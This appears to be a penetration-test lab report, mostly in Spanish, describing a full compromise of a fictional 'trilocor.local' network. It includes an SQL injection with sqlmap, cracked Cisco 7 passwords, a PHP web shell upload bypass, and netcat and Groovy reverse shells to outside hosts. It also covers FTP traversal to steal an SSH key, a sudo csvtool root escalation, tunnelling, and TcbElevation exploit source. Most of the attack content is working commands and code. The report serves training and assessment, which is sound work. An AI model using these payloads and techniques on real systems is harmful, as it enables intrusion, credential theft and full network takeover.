
---

{{ report.candidate.name }} performed the following to fully compromise the `trilocor.local` domain.

1. Se identificaron múltiples servicios expuestos en la infraestructura externa, lo que permitió ampliar la superficie de ataque inicial.

2. La enumeración de servicios web reveló varios subdominios accesibles públicamente, incluyendo entornos internos no destinados a exposición externa.
3. Se identificaron debilidades en aplicaciones web que permitieron obtener credenciales válidas de usuarios internos.
4. Las credenciales obtenidas permitieron acceder a aplicaciones internas adicionales, donde se descubrieron archivos sensibles con información de autenticación.
5. El uso de credenciales reutilizadas facilitó el acceso a repositorios y servicios internos que revelaron nuevos subdominios y vectores de ataque.
6. Se explotaron configuraciones inseguras en servicios web internos para ejecutar código de forma remota y obtener acceso inicial a un servidor en la zona perimetral.
7. Desde este servidor, se identificó conectividad hacia la red interna, lo que permitió el acceso a servidores críticos adicionales.
8. Configuraciones inseguras y servicios vulnerables permitieron la escalada de privilegios hasta obtener control total del servidor comprometido.
9. El acceso a recursos compartidos internos permitió la obtención de credenciales adicionales utilizadas para comprometer un servidor miembro del dominio.
10. Dentro de este servidor, configuraciones débiles de privilegios permitieron ejecutar código con los máximos permisos del sistema.
11. Desde el entorno comprometido, se obtuvo acceso a estaciones de trabajo internas, donde se identificaron credenciales almacenadas de forma insegura.
12. El uso de estas credenciales permitió el acceso a controladores de dominio y la manipulación de permisos dentro de Active Directory.
13. Abusando de relaciones de confianza, membresías de grupo y configuraciones incorrectas, se logró escalar privilegios dentro del dominio principal.
14. El compromiso del dominio permitió expandir el acceso hacia dominios relacionados y otros entornos conectados.
15. Finalmente, se obtuvo control total sobre múltiples sistemas críticos de la infraestructura, demostrando la posibilidad de un compromiso completo del entorno corporativo a partir de un único punto de entrada.


{{ report.candidate.name }} then performed the following to fully compromise the `trilocor.local` domain.

**Detailed reproduction steps for this attack chain are as follows:**

Se uso un escaneo`nmap` para descubrir puertos abiertos en la ip `10.129.5.203`

```bash
nmap -sCV 10.129.7.30
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 14:02 -0500
Nmap scan report for 10.129.7.30
Host is up (0.24s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.63
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: WEB-DMZ01, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp  open  domain   (unknown banner: BIND 9)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    BIND 9
| dns-nsid: 
|_  bind.version: BIND 9
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.3
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Trilocor &#8211; A cutting edge robotics company!
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-10-13T17:49:27
|_Not valid after:  2032-10-10T17:49:27
111/tcp open  rpcbind  2-4 (RPC #100000)
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more LITERAL+ SASL-IR STARTTLS OK IMAP4rev1 capabilities have IDLE post-login listed ID ENABLE LOGIN-REFERRALS Pre-login LOGINDISABLEDA0001
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-10-13T17:49:27
|_Not valid after:  2032-10-10T17:49:27
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-10-13T17:49:27
|_Not valid after:  2032-10-10T17:49:27
995/tcp open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-10-13T17:49:27
|_Not valid after:  2032-10-10T17:49:27
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.98%I=7%D=1/28%Time=697A5D5C%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,33,"\x001\0\x06\x85\0\0\x01\0\x01\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x07\x06BIND\x209");
Service Info: Host:  WEB-DMZ01; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.57 seconds
```

Luego se realizo solicito una transferencia de zona `(AXFR)`, consiguiendo asi una lista de subdominios

```bash
dig axfr @10.129.5.203 trilocor.local
```

![](/images/name/imagen.png){width="auto"}

Ademas se encontro un subdominio adicional usando el siguiente escaneo de `ffuf`.

```bash
ffuf -t 200 -H "Host: FUZZ.trilocor.local" -u http://trilocor.local -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt
```

![](/images/name/imagen-kzdSiRxh.png){width="auto"}

Bajo el subdominio `selfservicestg.trilocor.local`, se encontro un panel de Reinicio de password.

![](/images/name/imagen-zRSiACbm.png){width="auto"}

Al insertar un email generico `(a@a.com)`, nos sale el siguiente mensaje:

![](/images/name/imagen-iM19FoVB.png){width="auto"}

Pero si se coloca una `'` al principio del mismo, la pantalla queda en blanco.

![](/images/name/imagen-VesmkYr5.png){width="auto"}

Lo que podria indicar una posible `Inyeccion SQL`. Para llevar a cabo la misma se utilizo `sqlmap`, primero se intercepto la peticion con `Burpsuite`, y se guardo el contenido de la misma en un archivo llamado `req`.

![](/images/name/imagen-1OnQdTqL.png){width="auto"}
Descripcion: Contenido del archivo `req`.

Luego indicando el parametro vulnerable a la inyeccion `(email)`, se inicio el escaneo.

```bash
sqlmap -r req --batch --level 5 --risk 3 -p email
```

![](/images/name/imagen-CZOtVdMb.png){width="auto"}
Descripcion: Resultado del escaneo inicial, afirmando la vulnerabilidad.

Como el parametro es vulnerable, se enumeraron las bases de datos actuales.

```bash
sqlmap -r req --batch --level 5 --risk 3 -p email --dbs
```

![](/images/name/imagen-W3ffZGc4.png){width="auto"}
 
Y luego se enumeraron las tablas de la base de datos `status`.

```bash
sqlmap -r req --batch --level 5 --risk 3 -p email -D status --tables
```

![](/images/name/imagen-D7TUuQSw.png){width="auto"}

Una vez teniendo el nombre de las tablas, se dumpeo el contenido de la tabla `employees`.

![](/images/name/imagen-R278g71H.png){width="auto"}

Se utilizo la pagina [CrackStation](https://crackstation.net/), para poder romper estos hashes y asi descubrir la password en texto plano.

![](/images/name/imagen-hhW4eT7o.png){width="auto"}

Las credenciales del usuario `infra`, fueron utlizadas para el inicio de sesion en el panel de administracion de `Rocketchat (rocketchat.trilocor.local)`.

![](/images/name/imagen-rLXbVI0F.png){width="auto"}
Descripcion: Inicio de sesion con las credenciales --> `infra` : `!@#$bri@nn@!@#$`

Dentro de esta pagina se encontraron 3 grupos de conversacion.

![](/images/name/imagen-S1lSMD1S.png){width="auto"}

Dentro de grupo `Trilocor-devs`, se encontro el nombre de un nuevo subdominio, el mismo corresponder al servicio de `Gogs`.

![](/images/name/imagen-PgqiXqVF.png){width="auto"}

Por otro lado, en el grupo `Trilocor-Production-Support`, se encontro un archivo de configuracion, el cual se descargo para visualizar su contenido.

![](/images/name/imagen-l2Hfyw13.png){width="auto"}

Dentro de este archivo de configuracion, se hallaron hashes en formato `Cisco 7` para varios usuarios.

![](/images/name/imagen-5t0c4Hmy.png){width="auto"}

Para el crackeo de los mismos, se utilizo la herramienta `cisco7crack` la cual puede ser descargada en [este link](https://launchpad.net/ubuntu/noble/+package/cisco7crack).
Para instalar los paquetes de la mismas se uso el siguiente comando:

```bash
sudo dpkg -i cisco7crack_0.0~git20121221.f1c21dd-3_amd64.deb
```

Ya luego para romper dichos hashes, se usa una sintaxis como la siguiente:

```bash
cisco7crack <hash>
```

Asi con cada una, revelando asi las siguientes passwords.

```bash
cisco7crack 023557581E345C0048634837442426392C107A19
cisco7crack 08014249001C254641585B
cisco7crack 022C2455582B2F2F
cisco7crack 082B45420539091E1801
cisco7crack 023F544E280701607F1D5A1456
cisco7crack 02345457074701
cisco7crack 08116C5A0C15
```

![](/images/name/imagen-gQgCOocl.png){width="auto"}

Obteniendo asi los siguientes resultados:

| Username | Password |
|:---|:---|
| angie | @ngie@1337 |
| admin1 | S3cuR3AdM!N!STR@t0R |
| jane | J@n3M@n |
| jill | jill@lijj |
| ben | R0ll!n |
| kunal | P@tel |
| john  | Y0uCan!S33m3 |

Usando las credenciales del usuario `admin1`, se logro el inicio de sesion en el panel de `Gogs (gogs-qa0001.trilocor.local)`.

![](/images/name/imagen-5lG78MQu.png){width="auto"}

Dentro de esta pagina, se encontro un repositorio, con el nombre de subdominio adicional `(prototype-beta.trilocor.local)`.

![](/images/name/imagen-bupWfQP0.png){width="auto"}

Dentro de esta nueva pagina, se encuentra una nueva seccion, en la que se solicita un codigo.

![](/images/name/imagen-XqFoKbbs.png){width="auto"}

Clickeando en `Apply now`, se puede apreciar como en la url, bajo el parametro `page`, se apunta a un archivo.

![](/images/name/imagen-r2de5mcU.png){width="auto"}

Probando payloads para ver si se ocasiona un `LFI (Local File Inclusion)`, no tenemos exito, sin embargo tenemos la posibilidad de apuntar a archivos locales de la propia pagina como el `index.php`.

![](/images/name/imagen-HSxwRRpN.png){width="auto"}

Asi que para poder entender la logina de la pagina para poder burlar el campo de Insercion de codigo, se usaron filtros `php`.
Se intercepto la peticion de la carga de la `url` con Burpsuite.
Dentro de la misma se uso un filtro para poder convertir el codigo de un archivo propio de la pagina a codificacion en `base64`.

![](/images/name/imagen-PahKQrd0.png){width="auto"} 

Desde una consola copiamos toda la cadena y la decodificamos en `base64`, revelando asi su codigo.

```bash
echo "<chain base64>" | base64 -d 
```

Lo que da como resultado el siguiente codigo `php`.

```php
<?php

// redirect on direct access
if (__FILE__ === realpath($_SERVER['SCRIPT_FILENAME'])) {
    header('Location: index.php?page=apply.php');
}

session_start();

$code_form = '
<center>
<h1>Please enter your invite code</h1><br>
    <form style="width: 50%">
        <input type="text" name="code" class="form-control" id="invite-code" placeholder="Enter your code">
        <input type="hidden" name="page" value="apply.php" />
        <button type="submit" class="btn btn-primary">Submit</button>
    </form>
</center>
';

$submission_form = '
<center>
<h1>Please enter your details</h1><br>
    <form style="width: 50%" id="submissionForm">
        <input type="text" class="form-control" id="input-name" placeholder="Enter your full name" form="submissionForm" required>
        <input type="email" class="form-control" id="input-email" placeholder="Enter your email" form="submissionForm" required>
        <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm">
            <p>Please click on the image below to upload an image of your submission</p>
            <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png,.gif" form="uploadForm">
            <img src="/images/default.jpg" class="upload-image" id="upload-image" form="uploadForm">
            <br><input type="submit" value="Upload" id="submit-upload" class="btn btn-primary" form="uploadForm" style="background-color: green; border-color: green;">
            <p id="error_message"></p>
        </form>
        <input type="hidden" name="page" value="apply.php" form="submissionForm"/>
        <input type="hidden" name="submit" value="1" form="submissionForm"/>
        <br><button type="submit" id="submit-form" class="btn btn-primary" form="submissionForm" disabled>Send Your Submission</button>
    </form>
</center>
';

if (!isset($_SESSION["logged"]) || $_SESSION["logged"] !== true) {
    if (!isset($_GET["code"])) {
        echo $code_form;
    }
    // validate invite code
    else if (isset($_GET['code']) && preg_match('/^tril_[0-9A-Za-z]{4}_[0-9A-Za-z]{4}_[0-9A-Za-z]{4}_20[0-9]{2}$/i', $_GET['code'])) {
        $_SESSION["logged"] = true;
        header('Location: apply.php');
    } else {
        echo $code_form;
        echo '<center><p style="color: red">Invalid code!</p></center>';
    }
} else {
    if (isset($_GET['submit'])) {
        echo '<center><p>Your submission has been submitted successfully!</p></center>';
    } else {
        echo $submission_form;
    }
}
```

Las cosas que destacan de este codigo son las siguientes:

En esta porcion de codigo:

```php
if (!isset($_SESSION["logged"]) || $_SESSION["logged"] !== true) {
    if (!isset($_GET["code"])) {
        echo $code_form;
    }
    // validate invite code
    else if (isset($_GET['code']) && preg_match('/^tril_[0-9A-Za-z]{4}_[0-9A-Za-z]{4}_[0-9A-Za-z]{4}_20[0-9]{2}$/i', $_GET['code'])) {
        $_SESSION["logged"] = true;
        header('Location: apply.php');
    } else {
        echo $code_form;
        echo '<center><p style="color: red">Invalid code!</p></center>';
    }
```

Vimos que el formato que espera el formulario es algo como: `tril_AAAA_BBBB_CCCC_2024`, sin validarlo en una base de datos, por lo que se puede burlar facilmente con el mismo.
Una vez enviado dicho codigo, se aplica una especie de cookie `logged` a `True`, dandonos acceso a un formulario de subida de archivos.

En este ultimo, se aplica una validacion:

```php
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png,.gif" form="uploadForm">**text**
```

La cual la misma se puede ver en el repositorio de `Gogs` en el archivo `/src/upload.php`.

![](/images/name/imagen-Kt9oi2GR.png){width="auto"}

En el mismo se puede ver como se aplica una validacion, solicitando asi solamente archivos de imagenes `(.gif, .jpeg, etc)`, ademas valida que el archivo no tenga la extension `.php`, sin embargo, este filtro no aplica para archivos con extensiones como `phtml, phar`, haciendo asi que se pueda bypassear la validacion, depositando los archivos en la ruta `./user_submissions/`.

Para poder obtener ejecucion de comandos a traves de la subida de archivos, creamos un archivo `exploit.phmtl.png`, con el siguiente fragmento de codigo `php`.

```php
<? system($_GET['cmd']); ?>
```

Para subirlo primero tenemos que colocar un codigo generico con en el ejemplo anterior para poder burlar el panel.

![](/images/name/imagen-3QLxAE0e.png){width="auto"}

Con el uso del mismo, bypasseamos la validacion y podemos ver la seccion de subida de archivos.

![](/images/name/imagen-s9JIg8WL.png){width="auto"}

Aca solo completamos los datos, y clickeamos en la imagen que se ve para poder seleccionar nuestro archivo malicioso

![](/images/name/imagen-e6XksH5w.png){width="auto"}

Luego clickeamos en `Upload`, viendo asi el mensaje de exito.

![](/images/name/imagen-WpEqryPD.png){width="auto"}

Ahora para poder ejecutar comandos, podemos leer el archivo usando la propia vulnerabilidad `LFI` para poder leer el mismo y con el parametro `cmd` poder ejecutar comandos.

![](/images/name/imagen-yMHIfHww.png){width="auto"}

Luego nos ponemos en escucha con `nc`.

```bash
nc -nlvp 4444
```

Y desde la propia pagina enviamos una `Reverse shell` a nuestra maquina.

```bash
http://prototype-beta.trilocor.local/index.php?page=./user_submissions/exploit.phtml.png&cmd=busybox%20nc%2010.10.16.63%204444%20-e%20%2Fbin%2Fbash
```

![](/images/name/imagen-0io692Jg.png){width="auto"}

Recibiendo asi una shell como el usuario `websvc` en `DMZ01`

![](/images/name/imagen-rR8KeHI9.png){width="auto"}
![](/images/name/imagen-LyKCAOvq.png){width="auto"}
Descripcion: Flag `1`.

Viendo los puertos a nivel interno, se descubrio el puerto `2121`, en el cual corre el servicio de `uftpd`, mas en concreto la version 2.8.

```bash
nc localhost 2121
```

![](/images/name/imagen-PDj7colF.png){width="auto"}
Decripcion: Version vulnerable de `uftpd`

Para este servicio se encontro una vulnerabilidad `Buffer Overflow` y `Directory Traversal`. [En este blog](https://aaronesau.com/blog/post/6), se hace una prueba de concepto y la explicacion de ambas vulnerabilidades.

Lo que se hizo en este caso, fue primero conectarse al servicio como el usuario `anonymous` y la password `hi`.

```bash
nc localhost
USER anonymous
PASS hi
```

Luego con el comando `PORT` se configura un puerto para la transferencia, en este caso el puerto `1258`, que se configura de la siguiente forma

```bash
PORT 127.0.0.1,1,1002
```

Que se traduce como : 127.0.0.1 (Localhost), 1, 1002 (1 x 256 + 1002) = 1258

Luego con `RETR` se indica el archivo a leer usando el `Directory Traversal`, escapando del `chroot jail`

```bash
RETR ../../../srvadm/.ssh/id_rsa
```

Para recibir el contenido de la transferencia se envia una segunda shell o en este caso se conecta via `ssh` luego de haber agregado una clave `ed_25519`, y se activa el listener en el puerto `1258` como se menciono anteriormente.

```bash
nc -nvlp 1258
```

Luego enviamos.
![](/images/name/imagen-1SbzeUQb.png){width="auto" }
Descripcion: Prueba de concepto.

Y desde la otra consola se recibe correctamente el contenido de la clave `rsa`.

![](/images/name/imagen-DN2Ejm15.png){width="auto"}
Descripcion: Contenido de la clave `rsa` del usuario `srvadm`.
Copiando el contenido de la misma en un archivo, se le dan permisos de lectura.

```bash
chmod 600 id_rsa
```

Y se logro la conexion como el usuario `srvadm` via `SSH` con el uso de la misma.

```bash
ssh srvadm@10.129.5.203 -i id_rsa
```

![](/images/name/imagen-BKWdKBnt.png){width="auto"}
Descripcion: Flag `2`.

Dentro de la shell como este usuario, se identifico que el mismo tenia el privilegio de usar `/usr/bin/csvtool` como cualquier usuario, entre ellos el usuario `root`.

```bash
srvadm@WEB-DMZ01:~$ sudo -l
```

![](/images/name/imagen-BPiHkFGT.png){width="auto"}

Se hizo uso del mismo, con [esta guia de GTFObins](https://gtfobins.org/gtfobins/csvtool/#shell), para poder escalar al usuario `root`.

```bash
srvadm@WEB-DMZ01:~$ sudo /usr/bin/csvtool call '/bin/sh;false' /etc/hosts
```

Lo que hace este comando, es ejecutar `csvtool` como `root` con la opcion `call`, que lo que hace es ejecutar un comando en cada linea del `CSV`, lo cual deberia de hacerlo de forma segura, pero:

Indica que spawnee una `sh`.
```bash
/bin/sh
```

Y luego con `;` el cual es el separador de comandos en `bash` le pasamos `False` indicando que devueva un codigo de estado `1 (Fallido)`, luego indicando un archivo que puede ser cualquiera, solo necesita existir como el `/etc/hosts`.

De esta manera se consiguio una escalada de privilegios, conviertiendo asi al usuario `srvadm` en `root`.

![](/images/name/imagen-HLRmPLsc.png){width="auto"}
Descripcion: Shell como el usuario `root` a traves de privilegios `sudo`.

![](/images/name/imagen-1Z2tVp3g.png){width="auto"}
Descripcion: Flag `3`.

Dentro de `DMZ01` como el usuario `root`, se identifico una interfaz adicional en el segmento `172.16.139.0/24`.

```bash
root@WEB-DMZ01:~# ifconfig
```

![](/images/name/imagen-mVDXVlpT.png){width="auto"}

Por lo que se uso un `Ping Sweep` para identificar que `hosts` estan activos en dicho segmento de red, identificando asi, `2` hosts.

```bash
root@WEB-DMZ01:~# for i in {1..254} ;do (ping -c 1 172.16.139.$i | grep "bytes from" &) ;done
```

![](/images/name/imagen-cK7KgxuB.png){width="auto"}

Para poder identificar los puertos que corren para cada uno, se ulilizo el siguiente script en `bash`.

```bash
#!/bin/bash
ips=(172.16.139.3 172.16.139.10 172.16.139.35)
for ip in "${ips[@]}"; do
  echo "Escaneando $ip..."
  for i in $(seq 1 10000); do
      timeout 1 bash -c "echo '' > /dev/tcp/$ip/$i" 2>/dev/null && echo "\t[+] Puerto Abierto $i" &
  done; wait 
done
```

Con permisos de ejecucion `(chmod +x port_scan.sh)`, se ejecuto, identificando lo siguiente.

```bash
./port_scan.sh
```

![](/images/name/imagen-XUXjseR2.png){width="auto"}

Para poder acceder a dichos hosts, se realizo `Port Forwarding` usando `ligolo-ng`, el mismo se puede descargar [en este repositorio](https://github.com/nicocha30/ligolo-ng), descargando el agente y el proxy de acorde a el sistema operativo que se usa.

Para configurar el mismo, desde una shell local, creamos la interfaz de ligolo.

```bash
sudo ip tuntap add dev ligolo mode tun
sudo ip link set ligolo up
```

Luego desde nuestra consola, corremos el proxy en nuestro `localhost` por un puerto determinado.

```bash
./proxy -selfcert -laddr 0.0.0.0:443
```

El siguiente paso, es descargar el agente, el la maquina objetivo, en este caso `DMZ01`.

```bash
root@WEB-DMZ01:/tmp#  wget 10.10.16.63/agent; chmod +x agent
```

Ya despues, se corre el mismo indicando el servidor donde el proxy corre.

```bash
root@WEB-DMZ01:/tmp# ./agent -connect 10.10.16.63:443 -ignore-cert
```

![](/images/name/imagen-A09oG2QM.png){width="auto"}

Y desde nuestra consola, se puede ver la conexion de la maquina objetivo, solo queda con el comando `session` elegir la sesion, y luego empezarla.

![](/images/name/imagen-rxF0XKBy.png){width="auto"}

Luego para crear el tunel usamos el siguiente comando:

```bash
sudo ip route add 172.16.139.0/24 dev ligolo
```

Para comprobar la efectividad del mismo se hizo un escaneo de `nmap` contra este segmento.

```bash
nmap -v -n 172.16.139.0/24 -T4 --unprivilege
```

Identificando asi que `139.3` corresponde al host `DC01`, y `139.35` a `SRV01`.

![](/images/name/imagen-gaz5NCUv.png){width="auto"}
Descripcion: Puertos abiertos en `172.16.139.35 (DC01)`

![](/images/name/imagen-dJ6m3ipP.png){width="auto"}
Descripcion: Puertos abiertos en `172.16.139.3 (SRV01)`

Despues de haber creado el tunel, se accedio al puerto `2049 (NFS)`, donde se identifico un recurso compartido.

```bash
showmount -e 172.16.139.35
```

![](/images/name/imagen-DoVtpCRj.png){width="auto"}

Para acceder al mismo, primero se creo un directorio, y luego realizamos la montura del mismo.

```bash
mkdir -p /mnt/srv01
mount -t nfs 172.16.139.35:/SRV01
```

Dentro del mismo, se descubrieron varias carpetas.

![](/images/name/imagen-VgmUnO3h.png){width="auto"}

Dentro del archivo  `setup.py` dentro de`/apps/liferay/liferay-setup-script`, se hallaron credenciales.

![](/images/name/imagen-U8xqlqTb.png){width="auto"}
Descripcion: Contenido del archivo `setup.py`.

Dichas credenciales, fueron usadas en la pagina web que corre en el puerto `8080` de ese  mismo `host`.

![](/images/name/imagen-UCuP1vkN.png){width="auto"}
Descripcion: Servicio de Liferay corriendo en el puerto `8080`.

![](/images/name/imagen-WpSLX4yy.png){width="auto"}

Yendo al panel de opciones, `Control panel --> Server administration --> Script`, se encontro una consola que concedio la capacidad de ejecutar codigo Groovy.

![](/images/name/imagen-p3884ELD.png){width="auto"}

Con el uso de la misma, se uso el siguiente fragmento de codigo, para ejecutar comandos en el sistema.

```groovy
def cmd = "whoami"
def proc = cmd.execute()
def sout = new StringBuffer(), serr = new StringBuffer()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(10000)
println "Errores de red: " + serr
println "Salida: " + sout
```

![](/images/name/imagen-YIV7A8dS.png){width="auto"}
Descripcion: output del comando `whoami`.

Una vez que se consiguio ejecucion remota de comandos, de [revshells.com](https://www.revshells.com/), se uso el siguiente codigo para enviar una `Reverse Shell` a `DMZ01`.

```groovy
String host="172.16.139.10";int port=443;String cmd="powershell";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![](/images/name/imagen-rO8XHEFa.png){width="auto"}

Sin embargo, hay que tener en cuenta el hecho de desactivar el firewall en `DMZ01`.

```bash
ufw disable
```

Y luego poner en escucha con `nc`.

```bash
nc -nvlp 443
```

![](/images/name/imagen-HJbshedW.png){width="auto"}
Descripcion: Desactivacion del firewall en `DMZ01`.

Luego de ejecutar el comando, se logro la conexion como el usuario `svc_liferay` en `SRV01`.

![](/images/name/imagen-rd20d4OM.png){width="auto"}

![](/images/name/imagen-nocohlqK.png){width="auto"}
Descripcion: Flag `4`

En dicho host, se identifico el privilegio `SeTcbPrivilege` para el usuario `svc_liferay`, donde el mismo se encuentra desactivado.

```powershell
PS C:\users\svc_liferay\desktop> whoami /priv
```

![](/images/name/imagen-p3FF55MK.png){width="auto"}

Esta configuración de seguridad determina si un proceso puede asumir la identidad de cualquier usuario y, a través de este, obtener acceso a los recursos a los que el usuario objetivo puede acceder (`impersonación`).
Para activar el mismo se utilizo [Enable-Privilege.ps1](https://gist.githubusercontent.com/anzz1/506ddfb17173e14709cba38dbd576f22/raw/0bfbd26e4651c7c708974fe2c959679625e1ef77/Enable-Privilege.ps1).

Para descargar el mismo, subimos el binario a `DMZ01`.

```bash
root@WEB-DMZ01:~# wget 10.10.16.63/EnablePrivilege.ps1
```

Montamos un servidor con `python3` para servir el archivo y desde `SRV01` lo descargamos.

```powershell
PS C:\PROGRAMDATA> certutil -urlcache -split -f http://172.16.139.10:8080/EnablePrivilege.ps1 C:\programdata\EnablePrivilege.ps1
```

![](/images/name/imagen-wQd6Xuhu.png){width="auto"}

Con esto hecho, se puede hacer uso del mismo para habilitar dicho privilegio.

```powershell
PS C:\PROGRAMDATA> .\EnablePrivilege.ps1 -Priv SeTcbPrivilege
```

![](/images/name/imagen-NKQAsSXZ.png){width="auto"}
Descripcion: `SeTcbPrivilege` activado con exito.

Comprobamos que el mismo se habilito.

![](/images/name/imagen-GiHAAApY.png){width="auto"}

Se aprovecho la posesion de dicho derecho para poder impersonar al usuario `system`, para eso se uso `TcbElevation.exe`, el cual, dicho codigo tuvo que modificarse ligeramente para su compilacion en `Linux`, quedando de la siguiente manera:

```C++
// TcbElevation - Authors: @splinter_code and @decoder_it

#define SECURITY_WIN32
#define UNICODE 1
#define _UNICODE 1
#include <windows.h>
#include <sspi.h>
#include <stdio.h>

#pragma comment(lib, "Secur32.lib")

void EnableTcbPrivilege(BOOL enforceCheck);
BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege);
SECURITY_STATUS SEC_ENTRY AcquireCredentialsHandleWHook(LPWSTR pszPrincipal, LPWSTR pszPackage, unsigned long fCredentialUse, void* pvLogonId, void* pAuthData, SEC_GET_KEY_FN pGetKeyFn, void* pvGetKeyArgument, PCredHandle phCredential, PTimeStamp ptsExpiry);

int wmain(int argc, wchar_t** argv)
{

    if (argc < 3) {
        printf("usage: TcbElevation.exe [ServiceName] [CmdLine]\n");
        exit(-1);
    }

    EnableTcbPrivilege(TRUE);
    PSecurityFunctionTableW table = InitSecurityInterfaceW();
    table->AcquireCredentialsHandleW = AcquireCredentialsHandleWHook; // SSPI hooks trick borrowed from @tiraniddo --> https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82
    
    wchar_t* serviceName = argv[1];
    wchar_t* cmdline = argv[2];

    SC_HANDLE hScm = OpenSCManagerW(L"127.0.0.1", nullptr, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (!hScm)
    {
        printf("Error opening SCM %d\n", GetLastError());
        return 1;
    }

    SC_HANDLE hService = CreateService(hScm, serviceName, nullptr, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, cmdline, nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!hService)
    {
        printf("Error creating service %d\n", GetLastError());
        return 1;
    }

    if (!StartService(hService, 0, nullptr))
    {
        printf("Error starting service %d\n", GetLastError());
        return 1;
    }

    return 0;
}

BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    PRIVILEGE_SET privs;
    LUID luid;
    BOOL debugPrivEnabled = FALSE;
    if (!LookupPrivilegeValueW(NULL, lpszPrivilege, &luid))
    {
        printf("LookupPrivilegeValueW() failed, error %u\n", GetLastError());
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges() failed, error %u\n", GetLastError());
        return FALSE;
    }
    privs.PrivilegeCount = 1;
    privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
    privs.Privilege[0].Luid = luid;
    privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!PrivilegeCheck(hToken, &privs, &debugPrivEnabled)) {
        printf("PrivilegeCheck() failed, error %u\n", GetLastError());
        return FALSE;
    }
    if (!debugPrivEnabled)
        return FALSE;
    return TRUE;
}

void EnableTcbPrivilege(BOOL enforceCheck) {
    HANDLE currentProcessToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken);
    BOOL setPrivilegeSuccess = SetPrivilege(currentProcessToken, (wchar_t*)L"SeTcbPrivilege", TRUE);
    if (enforceCheck && !setPrivilegeSuccess) {
        printf("No SeTcbPrivilege in the token. Exiting...\n");
        exit(-1);
    }
    CloseHandle(currentProcessToken);
}

